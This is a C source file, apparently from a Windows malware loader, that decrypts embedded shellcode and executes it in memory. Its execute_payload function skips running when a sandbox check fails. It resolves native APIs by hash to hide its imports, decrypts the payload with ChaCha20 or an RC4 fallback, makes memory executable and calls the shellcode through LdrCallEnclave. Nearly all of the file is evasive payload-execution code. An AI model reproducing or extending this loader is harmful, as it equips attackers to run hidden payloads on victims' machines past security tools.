#include "memory.h"
#include "stealth_loader.h"
#include "evasion.h"
#include "crypto.h"
#include "api_resolver.h"

PVOID find_memory_region(size_t size) {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    PBYTE base = (PBYTE)sysInfo.lpMinimumApplicationAddress;
    base += (GetCurrentProcessId() * 0x1000) % (SIZE_T)(sysInfo.lpMaximumApplicationAddress - sysInfo.lpMinimumApplicationAddress);
    
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T querySize;
    
    for (PBYTE addr = base; addr < sysInfo.lpMaximumApplicationAddress; addr += mbi.RegionSize) {
        querySize = VirtualQuery(addr, &mbi, sizeof(mbi));
        if (querySize == 0) break;
        
        if (mbi.State == MEM_COMMIT && 
            (mbi.Protect & PAGE_EXECUTE_READ) &&
            mbi.RegionSize >= size) {
            return mbi.BaseAddress;
        }
    }
    
    return NULL;
}

HMODULE load_tprtdll() {
    HMODULE hTprt = GetModuleHandleW(L"tprtdll.dll");
    if (hTprt) return hTprt;
    
    hTprt = LoadLibraryExW(L"tprtdll.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (hTprt) return hTprt;
    
    wchar_t systemDir[MAX_PATH];
    GetSystemDirectoryW(systemDir, MAX_PATH);
    wcscat_s(systemDir, MAX_PATH, L"\\tprtdll.dll");
    
    hTprt = LoadLibraryExW(systemDir, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (hTprt) return hTprt;
    
    hTprt = LoadLibraryW(L"tprtdll.dll");
    
    return hTprt;
}

void execute_payload() {
    if (!is_safe_environment()) {
        return;
    }
    
    HMODULE hTprt = load_tprtdll();
    if (!hTprt) {
        hTprt = GetModuleHandleA("ntdll.dll");
    }
    
    if (!hTprt) return;
    
    _NtAllocateVirtualMemoryEx NtAllocateVirtualMemoryEx = 
        (_NtAllocateVirtualMemoryEx)get_function_by_hash(hTprt, compute_custom_hash("NtAllocateVirtualMemoryEx"));
    _NtProtectVirtualMemory NtProtectVirtualMemory = 
        (_NtProtectVirtualMemory)get_function_by_hash(hTprt, compute_custom_hash("NtProtectVirtualMemory"));
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    _LdrCallEnclave LdrCallEnclave = 
        (_LdrCallEnclave)get_function_by_hash(ntdll, compute_custom_hash("LdrCallEnclave"));
    
    if (!NtAllocateVirtualMemoryEx || !NtProtectVirtualMemory || !LdrCallEnclave) {
        return;
    }
    
    // Use enhanced ChaCha20 encryption instead of RC4
    BYTE derived_key[32];
    BYTE nonce[12];
    if (!derive_encryption_key_chacha(derived_key, sizeof(derived_key), nonce, sizeof(nonce))) {
        // Fallback to RC4 if ChaCha20 fails
        if (!derive_encryption_key(derived_key, sizeof(derived_key))) {
            return;
        }
    }
    
    PVOID shellcode_addr = find_memory_region(encrypted_shellcode_size);
    BOOL allocated = FALSE;
    
    if (!shellcode_addr) {
        SIZE_T region_size = encrypted_shellcode_size;
        NTSTATUS status = NtAllocateVirtualMemoryEx(
            GetCurrentProcess(),
            &shellcode_addr,
            &region_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
            NULL,
            0
        );
        
        if (status != 0) {
            return;
        }
        allocated = TRUE;
    }
    
    memcpy(shellcode_addr, encrypted_shellcode, encrypted_shellcode_size);
    
    // Use ChaCha20 if available, otherwise fallback to RC4
    if (derive_encryption_key_chacha(derived_key, sizeof(derived_key), nonce, sizeof(nonce))) {
        chacha20_cryptography((PBYTE)shellcode_addr, encrypted_shellcode_size, derived_key, sizeof(derived_key), nonce);
    } else {
        rc4_cryptography((PBYTE)shellcode_addr, encrypted_shellcode_size, derived_key, sizeof(derived_key));
    }
    
    if (allocated) {
        SIZE_T region_size = encrypted_shellcode_size;
        ULONG old_protect;
        NTSTATUS status = NtProtectVirtualMemory(
            GetCurrentProcess(),
            &shellcode_addr,
            &region_size,
            PAGE_EXECUTE_READ,
            &old_protect
        );
        
        if (status != 0) {
            VirtualFree(shellcode_addr, 0, MEM_RELEASE);
            return;
        }
    }
    
    FlushInstructionCache(GetCurrentProcess(), shellcode_addr, encrypted_shellcode_size);
    
    PVOID dummy_param = NULL;
    LdrCallEnclave((PENCLAVE_ROUTINE)shellcode_addr, 0, &dummy_param);
    
    if (allocated) {
        VirtualFree(shellcode_addr, 0, MEM_RELEASE);
    }
}